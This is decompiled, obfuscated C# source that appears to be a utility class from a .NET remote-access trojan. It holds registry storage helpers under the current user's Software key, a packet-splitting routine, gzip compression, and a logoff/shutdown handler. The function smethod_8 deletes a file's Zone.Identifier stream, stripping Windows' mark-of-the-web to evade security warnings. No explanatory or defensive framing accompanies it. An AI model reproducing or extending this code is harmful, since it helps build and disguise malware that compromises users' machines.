using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns1;
using ns5;

namespace ns2;

[StandardModule]
internal sealed class Class0
{
	public static byte[] smethod_0(string string_0)
	{
		return Encoding.UTF8.GetBytes(string_0);
	}

	public static string smethod_1(byte[] byte_0)
	{
		return Encoding.UTF8.GetString(byte_0);
	}

	public static object smethod_2(string string_0)
	{
		object result = default(object);
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\" + GClass1.smethod_5()).DeleteValue(string_0);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_3(string string_0)
	{
		try
		{
			return Conversions.ToString(Registry.CurrentUser.CreateSubKey("Software\\" + GClass1.smethod_5()).GetValue(string_0, ""));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_4(string string_0, string string_1)
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\" + GClass1.smethod_5()).SetValue(string_0, string_1);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static Array smethod_5(byte[] byte_0, string string_0)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(smethod_1(byte_0), string_0, -1, (CompareMethod)0);
		memoryStream.Write(byte_0, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(byte_0, array[0].Length + string_0.Length, byte_0.Length - (array[0].Length + string_0.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	public static void smethod_6(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Invalid comparison between Unknown and I4
		if ((int)e.get_Reason() == 1)
		{
			GClass4.smethod_1();
		}
		else if ((int)e.get_Reason() == 2)
		{
			GClass4.smethod_1();
		}
	}

	public static byte[] smethod_7(byte[] byte_0, ref bool bool_0)
	{
		checked
		{
			if (bool_0)
			{
				byte[] array = null;
				using (MemoryStream memoryStream = new MemoryStream())
				{
					GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true);
					gZipStream.Write(byte_0, 0, byte_0.Length);
					gZipStream.Dispose();
					memoryStream.Position = 0L;
					array = new byte[(int)memoryStream.Length + 1 - 1 + 1];
					memoryStream.Read(array, 0, array.Length);
					memoryStream.Dispose();
				}
				return array;
			}
			byte[] array2 = null;
			using (MemoryStream memoryStream2 = new MemoryStream(byte_0))
			{
				GZipStream gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
				byte[] array3 = new byte[4];
				memoryStream2.Position = memoryStream2.Length - 5L;
				memoryStream2.Read(array3, 0, 4);
				int num = BitConverter.ToInt32(array3, 0);
				memoryStream2.Position = 0L;
				array2 = new byte[num - 1 + 1 - 1 + 1];
				gZipStream2.Read(array2, 0, num);
				gZipStream2.Dispose();
				memoryStream2.Dispose();
			}
			return array2;
		}
	}

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true, ThrowOnUnmappableChar = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFile([MarshalAs(UnmanagedType.LPTStr)] string string_0);

	public static void smethod_8(string string_0)
	{
		try
		{
			DeleteFile(string_0 + ":Zone.Identifier");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
